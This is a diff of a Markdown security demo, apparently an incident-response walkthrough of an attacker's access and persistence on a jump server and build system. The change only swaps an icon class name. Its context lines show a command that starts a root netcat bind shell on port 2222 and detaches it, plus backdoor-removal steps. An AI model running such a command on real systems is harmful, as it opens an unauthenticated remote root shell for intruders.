@@ -37,7 +37,7 @@ User ec2-user may run the following commands on jumpserver:
     (ALL) NOPASSWD: ALL
 ```
 
-> <i class="fa fa-info"></i> **Note:**
+> <i class="fa fa-circle-info"></i> **Note:**
 > 
 > Your output may vary, depending on what user and permissions are available on the server.
 
@@ -245,7 +245,7 @@ sudo nc -l -p 2222 -e "/bin/bash" &
 disown
 ```
 
-> <i class="fa fa-info"></i> **Note:**
+> <i class="fa fa-circle-info"></i> **Note:**
 > 
 > On some machines, `nc` might error, saying that the `-e` flag doesn't exist. If that is the case, we'll need to use a FIFO pipe trick to get the input and output of netcat into a bash process:
 > 
@@ -307,7 +307,7 @@ Now that we know the attacker's method of access and persistence method, we can 
 - remove the backdoor user from both systems
 - remove Netcat from the build system
 
-> <i class="fa fa-info"></i> **Note:**
+> <i class="fa fa-circle-info"></i> **Note:**
 >
 > The uninstall script will automatically perform some of these clean-up actions to help reset the demo machines.
 
